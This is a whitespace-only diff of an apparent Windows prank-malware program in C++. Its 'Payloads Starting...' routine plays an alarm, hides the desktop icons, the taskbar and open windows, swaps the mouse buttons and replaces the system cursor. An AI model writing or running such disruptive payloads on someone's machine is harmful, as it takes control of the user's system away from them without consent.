@@ -67,7 +67,6 @@ void hideWindows() {
 }
 
 void hideIcons() {
-
 	// Oculta iconos escritorio
 	ShowWindow(hDesktopWnd, SW_HIDE);
 }
@@ -88,14 +87,12 @@ BOOL WINAPI ConsoleHandler(DWORD signal) {
 
 void hideTaskBar()
 {
-
 	ShowWindow(lHwnd, SW_HIDE);
 }
 
 void changeCursor()
 {
 	wstring cursorFile = exeFolder + L"\\Content\\cursor.cur";
-
 	char buffer[MAX_PATH];
 	GetModuleFileNameA(NULL, buffer, MAX_PATH);
 	string::size_type pos = string(buffer).find_last_of("\\/");
@@ -110,7 +107,6 @@ void changeCursor()
 	Ico.yHotspot = 0;
 
 	HCURSOR c = CreateIconIndirect(&Ico);
-
 	SetSystemCursor(c, OCR_NORMAL);
 }
 
@@ -118,7 +114,6 @@ void swapCursor()
 {
 	BOOL swapButtons = TRUE;
 	SwapMouseButton(swapButtons);
-
 	const int screenWidth = GetSystemMetrics(SM_CXSCREEN);
 	const int screenHeight = GetSystemMetrics(SM_CYSCREEN);
 }
@@ -130,7 +125,6 @@ int main()
 	exeFolder = exeFolder.substr(0, exeFolder.find_last_of(L"\\/"));
 	
 	// Payloads Starting...
-
 	playAlarm();
 	hideWindows();
 	hideTaskBar();
